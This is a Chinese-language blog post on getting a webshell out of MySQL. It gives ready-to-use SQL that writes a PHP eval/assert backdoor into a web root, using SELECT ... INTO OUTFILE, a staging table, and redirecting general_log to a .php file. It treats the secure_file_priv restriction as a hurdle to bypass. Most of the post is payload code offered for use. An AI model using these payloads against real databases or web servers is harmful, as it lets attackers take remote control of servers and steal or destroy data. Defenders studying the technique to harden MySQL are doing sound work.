---
layout: post
title: MySQL获取Webshell
categories: [安全, MySQL, Webshell]
description: MySQL获取Webshell
keywords: 安全, MySQL, webshell
---

## MySQL获取Webshell
### 1.select ... into outfile
在MySQL数据库没有设置导入导出权限的时候，我们可以通过select ... into outfile获取webshell，如果MySQL的运行权限极高，那么我们通过MySQL上传的webshell也会获得相应的权限，甚至可以直接添加管理员账户，步骤一般如下：
1. 查找可读写目录
2. 通过select ... into outfile获取webshell

select ... into outfile有如下几种方式：
```sql
select "<?php @eval($_POST[b]);?>" into outfile "/var/www/html/webshell.php";
```
```sql
create table webshell(a blog);
insert into webshell(a) value("<?php @eval($_POST[b]);?>");
select a from webshell into outfile "/var/www/html/webshell.php";
```
### 2.通过general_log选项获取webshell
1. 直接导出webshell失败
有时候通过select into outfile等方法直接导出webshell会失败，显示错误信息如下：
```sql
The MySQL server is ruuning with the --secure-fie-priv option so it cannot execute this statement
```
意思是Mysql服务器运行"--secure-file-priv选项，所以不能执行这个语句。
2. secure_file_priv选项
在Mysql中使用secure_file_priv配置项来完成对数据导入导出的限制，前面的webshell导出就是如此。在Mysql官方给出了"--secure-file-priv=name limit LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE() to file within specified directory"解释，限制导入导出文件到指定的目录，其具体用法如下：
- 限制mysqld不允许导入导出
```sql
mysqld --secure_file_priv=null
```
- 限制mysqld的导入和导出只能发生在/tmp/目录下
```sql
mysqld --secure_file_priv=/tmp/
```
- 不对mysqld的导入和导出做限制，在/etc/my.cnf文件中不指定值

3. 通过general_log和general_log_file来获取webshell
mysql打开general_log后，所有的查询语句都可以在general_log文件中以可读的方式得到，也就是说，general_log_file会记录所有的查询语句，以原始的状态来显示，如果将general_log开关打开，general_log_file设置为一个php文件，则查询的操作将会全部写入到general_log_file指定的文件中，通过访问general_log_file指定的文件来获取webshell（注意：general_log_file所在目录一定要具备读写权限，同时该目录应该在web服务所能覆盖的范围之内）。整个过程执行步骤如下：
```sql
set global general_log='on';
set global general_log_file='/var/www/html/webshell.php';
select '<?php assert($_POST['pass']);?>';
```